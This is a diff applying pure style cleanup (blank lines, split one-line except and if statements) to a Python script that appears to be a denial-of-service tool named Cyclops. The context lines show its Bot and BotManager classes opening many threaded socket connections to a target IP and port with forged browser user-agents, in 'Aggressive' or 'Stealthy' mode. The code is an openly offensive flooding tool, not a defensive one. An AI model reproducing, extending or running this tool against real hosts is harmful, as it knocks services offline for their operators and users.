@@ -8,6 +8,7 @@ from threading import Thread
 from random import randint, choice
 from string import ascii_lowercase
 
+
 class Useragent(object):
 
     @property
@@ -28,8 +29,10 @@ class Useragent(object):
 
     def get(self):
         a = 'Mozilla/5.0 (Windows NT {}; Win64; x64)'.format(self.get_win_version)
-        b = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(self.get_chrome_version)
+        b = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(
+            self.get_chrome_version)
         return '{} {}'.format(a, b)
+
 
 class Session(object):
 
@@ -44,7 +47,8 @@ class Session(object):
             self.session.connect((self.ip, self.port))
             self.send_packet(header)
             is_connected = True
-        except:pass
+        except:
+            pass
         finally:
             return is_connected
 
@@ -53,14 +57,17 @@ class Session(object):
         try:
             self.session.sendall(packet)
             sent = True
-        except:pass
+        except:
+            pass
         finally:
             return sent
 
     def close(self):
         try:
             self.session.close()
-        except:pass
+        except:
+            pass
+
 
 class Bot(object):
 
@@ -93,13 +100,16 @@ class Bot(object):
                 self.get_session()
                 if not self.session.connect(self.header):
                     self.session.close()
-            except:pass
+            except:
+                pass
             else:
                 for _ in range(2):
                     pkt = self.packet
-                    if not self.is_alive:break
+                    if not self.is_alive:
+                        break
                     if self.session.send_packet(pkt):
-                        if not self.is_aggressive:self.sleep()
+                        if not self.is_aggressive:
+                            self.sleep()
                     else:
                         break
                 self.session.close()
@@ -131,6 +141,7 @@ class Bot(object):
     def get_session(self):
         self.session = Session(self.ip, self.port)
 
+
 class BotManager(object):
 
     def __init__(self, ip, port, is_aggressive, max_bots):
@@ -141,7 +152,8 @@ class BotManager(object):
 
     def start(self):
         session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        try:session.connect((self.ip, self.port))
+        try:
+            session.connect((self.ip, self.port))
         except:
             print('Error: Unable to connect to the target. Proceeding anyway')
 
@@ -157,6 +169,7 @@ class BotManager(object):
             t.start()
         self.is_alive = False
 
+
 class Cyclops(object):
 
     def __init__(self, ip, port, threads, is_aggressive=True):
@@ -170,7 +183,8 @@ class Cyclops(object):
         try:
             Thread(target=self.bot_manager.start, daemon=True).start()
             mode = 'Aggressive' if self.is_aggressive else 'Stealthy'
-            print('Target: {}:{}\nMode: {}\nBots: {}'.format(self.ip, self.port, mode, self.threads))
+            print('Target: {}:{}\nMode: {}\nBots: {}'.format(
+                self.ip, self.port, mode, self.threads))
         except:
             self.bot_manager.stop()
 
